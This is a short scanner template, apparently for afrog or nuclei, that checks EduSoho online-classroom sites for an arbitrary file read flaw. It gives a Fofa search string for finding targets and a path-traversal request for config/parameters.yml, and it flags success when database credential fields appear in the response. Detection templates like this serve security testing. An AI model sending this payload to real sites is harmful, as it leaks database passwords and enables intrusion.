id: edusohu-classroom-course-statistics-fileread

info:
  name: Edusoho网络课堂cms存在任意文件读取
  author: zan8in
  severity: high
  description: |
    Edusoho网络课堂是面向个人、学校、培训机构及企业用户的友好、开源、高性价比的在线教育建站系统。Edusoho网络课堂存在任意文件读取漏洞
    Fofa: title="EduSoho"
  reference:
    - https://mp.weixin.qq.com/s/NPpLQI7eET1NR2FHIJfNww
  tags: edusoho,fileread
flow: |
  http("r0")

http:
  - id: "r0"
    raw:
      - |
        GET /export/classroom-course-statistics?fileNames[]=../../../config/parameters.yml HTTP/1.1
        Host: {{Hostname}}

        

    matchers:
      - type: dsl
        dsl:
          - status_code == 200 &&  contains(body,"parameters:") && contains(body,"database_driver:") && contains(body,"database_host:") && contains(body,"database_port:") && contains(body,"database_name:") && contains(body,"database_password:") 
        condition: and

